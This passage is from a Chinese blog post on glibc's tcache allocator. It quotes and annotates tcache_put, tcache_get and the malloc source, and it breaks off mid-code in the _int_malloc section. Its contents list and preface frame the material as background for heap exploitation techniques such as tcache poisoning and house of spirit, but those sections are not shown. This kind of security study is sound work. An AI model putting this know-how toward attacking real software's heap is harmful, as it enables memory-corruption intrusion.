<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>tcache机制 | nocbtm's Blog</title><meta name="description" content="tcache机制"><meta name="keywords" content="pwn"><meta name="author" content="nocbtm"><meta name="copyright" content="nocbtm"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon3.ico"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="canonical" href="https://nocbtm.github.io/2020/02/27/tcache机制/"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="tcache机制"><meta name="twitter:description" content="tcache机制"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><meta property="og:type" content="article"><meta property="og:title" content="tcache机制"><meta property="og:url" content="https://nocbtm.github.io/2020/02/27/tcache机制/"><meta property="og:site_name" content="nocbtm's Blog"><meta property="og:description" content="tcache机制"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="prev" title="unlink" href="https://nocbtm.github.io/2020/02/27/unlink/"><link rel="next" title="free源码简单分析" href="https://nocbtm.github.io/2020/02/26/free源码简单分析/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://nocbtm.github.io","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  highlight_copy: 'true',
  highlight_lang: 'true',
  highlight_shrink: 'false',
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    title: '添加书签',
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  copyright: undefined,
  copy_copyright_js: false
  
}</script></head><body><div id="header"> <div id="page-header"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">nocbtm's Blog</a></span><i class="fa fa-bars fa-fw toggle-menu pull-right close" aria-hidden="true"></i><span class="pull-right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/learn/"><i class="fa-fw fa fa-book"></i><span> 学习资源</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> 友情链接</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 大佬博客</span></a></li><li><a class="site-page" href="/link2/"><i class="fa-fw fa fa-book"></i><span> 学弟学妹们</span></a></li><li><a class="site-page" href="/link_vn/"><i class="fa-fw fa fa-link"></i><span> V&amp;N</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> (o≖◡≖)</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/gallery/"><i class="fa-fw fa fa-area-chart"></i><span> 相册</span></a></li><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 影片</span></a></li></ul></div><script>document.body.addEventListener('touchstart', function(){ });</script></div></span><span class="pull-right" id="search_button"></span></div></div><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="lozad avatar_img" src="/img/header1.png" onerror="onerror=null;src='/img/friend_404.gif'"></div><div class="mobile_post_data"><div class="mobile_data_item is_center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">88</div></a></div></div><div class="mobile_data_item is_center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">15</div></a></div></div><div class="mobile_data_item is_center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">16</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/learn/"><i class="fa-fw fa fa-book"></i><span> 学习资源</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> 友情链接</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 大佬博客</span></a></li><li><a class="site-page" href="/link2/"><i class="fa-fw fa fa-book"></i><span> 学弟学妹们</span></a></li><li><a class="site-page" href="/link_vn/"><i class="fa-fw fa fa-link"></i><span> V&amp;N</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> (o≖◡≖)</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/gallery/"><i class="fa-fw fa fa-area-chart"></i><span> 相册</span></a></li><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 影片</span></a></li></ul></div><script>document.body.addEventListener('touchstart', function(){ });</script></div></div><div id="mobile-sidebar-toc"><div class="toc_mobile_headline">目录</div><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#前言"><span class="toc_mobile_items-number">1.</span> <span class="toc_mobile_items-text">前言</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#源码分析"><span class="toc_mobile_items-number">2.</span> <span class="toc_mobile_items-text">源码分析</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#相关数据结构"><span class="toc_mobile_items-number">2.1.</span> <span class="toc_mobile_items-text">相关数据结构</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#基本操作"><span class="toc_mobile_items-number">2.2.</span> <span class="toc_mobile_items-text">基本操作</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#tcache-put"><span class="toc_mobile_items-number">2.3.</span> <span class="toc_mobile_items-text">tcache_put</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#tcache-get"><span class="toc_mobile_items-number">2.4.</span> <span class="toc_mobile_items-text">tcache_get</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#tcache-in-malloc"><span class="toc_mobile_items-number">3.</span> <span class="toc_mobile_items-text">tcache in malloc</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#libc-malloc"><span class="toc_mobile_items-number">3.1.</span> <span class="toc_mobile_items-text">__libc_malloc</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#int-malloc"><span class="toc_mobile_items-number">3.2.</span> <span class="toc_mobile_items-text">_int_malloc</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#处理fastbin"><span class="toc_mobile_items-number">3.2.1.</span> <span class="toc_mobile_items-text">处理fastbin</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#处理-smallbin"><span class="toc_mobile_items-number">3.2.2.</span> <span class="toc_mobile_items-text">处理 smallbin</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#遍历unsorted-bin"><span class="toc_mobile_items-number">3.2.3.</span> <span class="toc_mobile_items-text">遍历unsorted bin</span></a></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#tcache-in-free"><span class="toc_mobile_items-number">4.</span> <span class="toc_mobile_items-text">tcache in free</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#总结"><span class="toc_mobile_items-number">5.</span> <span class="toc_mobile_items-text">总结</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#tcache-dup"><span class="toc_mobile_items-number">6.</span> <span class="toc_mobile_items-text">tcache_dup</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#介绍"><span class="toc_mobile_items-number">6.1.</span> <span class="toc_mobile_items-text">介绍</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#代码"><span class="toc_mobile_items-number">6.2.</span> <span class="toc_mobile_items-text">代码</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#tcache-house-of-spirit"><span class="toc_mobile_items-number">7.</span> <span class="toc_mobile_items-text">tcache_house_of_spirit</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#介绍-1"><span class="toc_mobile_items-number">7.1.</span> <span class="toc_mobile_items-text">介绍</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#代码-1"><span class="toc_mobile_items-number">7.2.</span> <span class="toc_mobile_items-text">代码</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#overlapping-chunks-by-caching"><span class="toc_mobile_items-number">8.</span> <span class="toc_mobile_items-text">overlapping_chunks_by_caching</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#介绍-2"><span class="toc_mobile_items-number">8.1.</span> <span class="toc_mobile_items-text">介绍</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#代码-2"><span class="toc_mobile_items-number">8.2.</span> <span class="toc_mobile_items-text">代码</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#tcache-poisoning"><span class="toc_mobile_items-number">9.</span> <span class="toc_mobile_items-text">tcache_poisoning</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#介绍-3"><span class="toc_mobile_items-number">9.1.</span> <span class="toc_mobile_items-text">介绍</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#代码-3"><span class="toc_mobile_items-number">9.2.</span> <span class="toc_mobile_items-text">代码</span></a></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#总结-1"><span class="toc_mobile_items-number"></span> <span class="toc_mobile_items-text">总结</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#参考"><span class="toc_mobile_items-number"></span> <span class="toc_mobile_items-text">参考</span></a></div></div><div id="body-wrap"><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true">     </i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#源码分析"><span class="toc-number">2.</span> <span class="toc-text">源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#相关数据结构"><span class="toc-number">2.1.</span> <span class="toc-text">相关数据结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基本操作"><span class="toc-number">2.2.</span> <span class="toc-text">基本操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-put"><span class="toc-number">2.3.</span> <span class="toc-text">tcache_put</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-get"><span class="toc-number">2.4.</span> <span class="toc-text">tcache_get</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-in-malloc"><span class="toc-number">3.</span> <span class="toc-text">tcache in malloc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#libc-malloc"><span class="toc-number">3.1.</span> <span class="toc-text">__libc_malloc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#int-malloc"><span class="toc-number">3.2.</span> <span class="toc-text">_int_malloc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#处理fastbin"><span class="toc-number">3.2.1.</span> <span class="toc-text">处理fastbin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#处理-smallbin"><span class="toc-number">3.2.2.</span> <span class="toc-text">处理 smallbin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#遍历unsorted-bin"><span class="toc-number">3.2.3.</span> <span class="toc-text">遍历unsorted bin</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-in-free"><span class="toc-number">4.</span> <span class="toc-text">tcache in free</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-dup"><span class="toc-number">6.</span> <span class="toc-text">tcache_dup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#介绍"><span class="toc-number">6.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#代码"><span class="toc-number">6.2.</span> <span class="toc-text">代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-house-of-spirit"><span class="toc-number">7.</span> <span class="toc-text">tcache_house_of_spirit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#介绍-1"><span class="toc-number">7.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#代码-1"><span class="toc-number">7.2.</span> <span class="toc-text">代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#overlapping-chunks-by-caching"><span class="toc-number">8.</span> <span class="toc-text">overlapping_chunks_by_caching</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#介绍-2"><span class="toc-number">8.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#代码-2"><span class="toc-number">8.2.</span> <span class="toc-text">代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-poisoning"><span class="toc-number">9.</span> <span class="toc-text">tcache_poisoning</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#介绍-3"><span class="toc-number">9.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#代码-3"><span class="toc-number">9.2.</span> <span class="toc-text">代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结-1"><span class="toc-number"></span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number"></span> <span class="toc-text">参考</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png)"><div id="post-info"><div id="post-title"><div class="posttitle">tcache机制</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2020-02-27<span class="post-meta__separator">|</span><i class="fa fa-history" aria-hidden="true"></i> 更新于 2020-04-09</time><span class="post-meta__separator mobile_hidden">|</span><span class="mobile_hidden"><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/pwn/">pwn</a></span><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">3,579</span><span class="post-meta__separator">|</span><span>阅读时长: 16 分钟</span><span class="post-meta__separator">|</span><span>阅读量: </span><span id="busuanzi_value_page_pv"></span></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>glibc 2.26</code> 开始引入了 <code>tcache</code> , 相关的 commit 可以看<br><a href="https://sourceware.org/git/p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc" target="_blank" rel="noopener">https://sourceware.org/git/p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc</a> 。<br>加入 <code>tcache</code> 对性能有比较大的提升，不过由于 <code>tcache</code> 的存在 ，一些利用方式的限制条件就少了许多。具体往下看。</p>
<p>相关文件位于 <a href="https://github.com/andigena/ptmalloc-fanzine/tree/master/05-tcache" target="_blank" rel="noopener">https://github.com/andigena/ptmalloc-fanzine/tree/master/05-tcache</a></p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>首先分析分析源码，看看 <code>tcache</code> 的工作原理</p>
<h3 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS]; <span class="comment">// TCACHE_MAX_BINS = 64</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
<p><code>tcache</code> 也是使用 类似 bins 方式来管理<code>tcache</code>  。</p>
<p><code>tcache_perthread_struct</code> 是整个<code>tcache</code> </p>
<p>每一项由 相同大小的 chunk 通过 <code>tcache_entry</code> 使用单向链表链接（类似于fastbin的链接方式）。</p>
<p>counts 用于记录 entries 中每一项当前链入的 chunk 数目， 最多可以有 7 个 chunk。</p>
<p><code>tcache_entry</code> 用于链接 chunk 的结构体， 其中就一个 next 指针，指向下一个相同大小的 chunk.</p>
<h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>下面通过分析对 tcache 的两个基本操作理解上面结构体的作用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;  <span class="comment">// 增加到链表头部</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);  <span class="comment">// 记录当前 bin 的 chunk数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h3><p>用于把一个 <code>chunk</code> 放到 指定的 <code>tcache-&gt;entries</code> 里面去， <code>tc_idx</code> 通过 <code>csize2tidx (nb)</code> 计算得到 （<code>nb</code>是 <code>chunk</code> 的大小）。</p>
<p>它首先把 <code>chunk+2*SIZE_SZ</code> （就是除去 <code>header</code> 部分） 强制转换成 <code>tcache_entry *</code> 类型，然后插入到 <code>tcache-&gt;entries[tc_idx]</code> 的首部，最后把 <code>tcache-&gt;counts[tc_idx]</code> 加 <code>1</code> ，表示新增了一个 <code>chunk</code> 到 该 表项。</p>
<h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h3><p>根据 <code>tc_idx</code> 取出 <code>tcache-&gt;entries[tc_idx]</code> 的第一个<code>chunk</code> ， 然后把 指针强制转换为 <code>(void *)</code></p>
<p>这样就可以大概得到一个图</p>
<ul>
<li><code>tcache-&gt;entries</code> 的每一项通过 单向链表链接 <code>chunk</code> 。</li>
<li><code>tcache_entry</code> 和 <code>malloc chunk</code> 是重叠的， <code>tcache_entry-&gt;next</code> 和 <code>chunk-&gt;fd</code> 是一个位置。</li>
</ul>
<h2 id="tcache-in-malloc"><a href="#tcache-in-malloc" class="headerlink" title="tcache in malloc"></a>tcache in malloc</h2><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p><code>malloc</code> 的入口点是 <code>__libc_malloc</code> （做了一些注释）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">.............</span><br><span class="line">.............</span><br><span class="line">.............</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);  <span class="comment">// tbytes 为 bytes请求的 转换后得到的 chunk 的 size</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);  <span class="comment">// 根据大小 tbytes ， 找到 tcache-&gt;entries 索引</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 如果 tcache-&gt;entries[tc_idx] 有 chunk ，就返回</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx); <span class="comment">// 调用 tcache_get 拿到 chunk 然后返回</span></span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">	      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br></pre></td></tr></table></figure>
<p>首先判断 <code>tcache-&gt;entries[tc_idx]</code> 里面有没有 <code>chunk</code> ，如果有就直接返回，否则进入 <code>_int_malloc</code> 分配内存。</p>
<p>下面看看 <code>_int_malloc</code> （主要看 <code>tcache</code> 处理的部分）</p>
<h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><h4 id="处理fastbin"><a href="#处理fastbin" class="headerlink" title="处理fastbin"></a>处理fastbin</h4><p>首先是把 请求的 <code>size</code> 转换成 实际 <code>malloc</code> 内部的 <code>size</code> ，然后定义了一个宏</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从 fastbin里面移除 pp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REMOVE_FB(fb, victim, pp)			\</span></span><br><span class="line">  <span class="keyword">do</span>							\</span><br><span class="line">    &#123;							\</span><br><span class="line">      victim = pp;					\</span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)				\</span><br><span class="line">	<span class="keyword">break</span>;						\</span><br><span class="line">    &#125;							\</span><br><span class="line">  <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="line">	 != victim);</span><br></pre></td></tr></table></figure>
<p>用于多线程的中从 <code>fastbin</code> 里面移除一个 <code>chunk</code>.</p>
<p>然后进入分配的流程， 首先如果 <code>size</code> 在 <code>fastbin</code> 的范围内进入， <code>fastbin</code> 分配的流程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 